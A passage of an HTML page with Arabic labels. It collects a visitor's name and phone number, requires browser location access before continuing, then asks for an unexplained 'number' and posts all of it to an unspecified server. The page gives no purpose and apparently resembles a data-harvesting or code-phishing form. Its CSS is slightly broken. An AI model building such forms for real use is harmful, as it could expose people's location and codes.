    .card {
      background: rgba(0, 0, 0, 0.55);
      backdrop-filter: blur(6px);
      border-radius: 16px;
      padding: 40px 30px;
      max-width: 380px;
      width: 90%;
      text-align: center;
      color: white;
    }

    h1 {
      margin-bottom: 24px;
      font-size: 2rem;
    }

    label {
      display: block;
      text-align: right;
      margin-bottom: 4px;
      font-size: 0.9rem;
      color: #ddd;
    }

    input {
      padding: 10px;
      width: 100%;
      margin-bottom: 16px;
      border-radius: 8px;
      border: none;
      font-size: 1rem;
      box-sizing: border-box;
    }

    button {
      padding: 12px 30px;
      background: #f59e0b;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      width: 100%;
    }

    button:hover {
      background: #d97706;
    }

    #result {
      margin-top: 14px;
      font-size: 0.95rem;
    }

      display: none;
    }

<body>

  <!-- الصفحة الأولى -->
  <div class="card" id="page1">

    <h1>بياناتك</h1>

    <label>الاسم:</label>
    <input
      type="text"
      id="name"
      placeholder="اكتب اسمك"
      autocomplete="name"
    >

    <label>رقم الهاتف:</label>
    <input
      type="tel"
      id="phone"
      placeholder="01012345678"
      autocomplete="tel"
    >

    <button onclick="getLocation()">
      التالي
    </button>

    <p id="result"></p>

  </div>


  <!-- الصفحة الثانية -->
  <div class="card hidden" id="page2">

    <h1>أدخل الرقم</h1>

    <label>الرقم:</label>

    <input
      type="text"
      id="referenceNumber"
      placeholder="اكتب الرقم"
      inputmode="numeric"
    >

    <button onclick="submitFinalData()">
      إرسال
    </button>

    <p id="result2"></p>

  </div>


  <script>

    const SERVER_URL = '';

    let userData = {
      name: '',
      phone: '',
      lat: null,
      lon: null
    };


    // الصفحة الأولى
    function getLocation() {

      const name = document.getElementById("name").value.trim();
      const phone = document.getElementById("phone").value.trim();

      if (!name || !phone) {
        alert("من فضلك اكتب الاسم ورقم الهاتف");
        return;
      }

      if (!navigator.geolocation) {

        alert("المتصفح لا يدعم تحديد الموقع");
        return;

      }

      document.getElementById("result").innerText =
        "جاري الحصول على الموقع...";

      navigator.geolocation.getCurrentPosition(

        (position) => {

          userData.name = name;
          userData.phone = phone;
          userData.lat = position.coords.latitude;
          userData.lon = position.coords.longitude;

          // الانتقال للصفحة الثانية
          document.getElementById("page1").classList.add("hidden");
          document.getElementById("page2").classList.remove("hidden");

        },

        (error) => {

          document.getElementById("result").innerText =
            "يجب السماح بالوصول إلى الموقع للمتابعة.";

        }

      );
    }


    // الصفحة الثانية
    function submitFinalData() {

      const referenceNumber =
        document.getElementById("referenceNumber").value.trim();

      if (!referenceNumber) {

        alert("من فضلك اكتب الرقم");
        return;

      }

      document.getElementById("result2").innerText =
        "جاري إرسال البيانات...";


      fetch(SERVER_URL + '/submit', {

        method: 'POST',

        headers: {
          'Content-Type': 'application/json'
        },

        body: JSON.stringify({

          name: userData.name,
          phone: userData.phone,
          lat: userData.lat,
          lon: userData.lon,
          referenceNumber: referenceNumber

        })

      })

      .then(res => res.json())

      .then(data => {

        if (data.success) {

          document.getElementById("result2").innerText =
            "تم إرسال البيانات بنجاح ✅";

        } else {

          document.getElementById("result2").innerText =
            "حدث خطأ أثناء الإرسال";

        }

      })

      .catch(err => {

        console.error(err);

        document.getElementById("result2").innerText =
          "تعذر الاتصال بالسيرفر";

      });

    }

  </script>

</body>
</html>
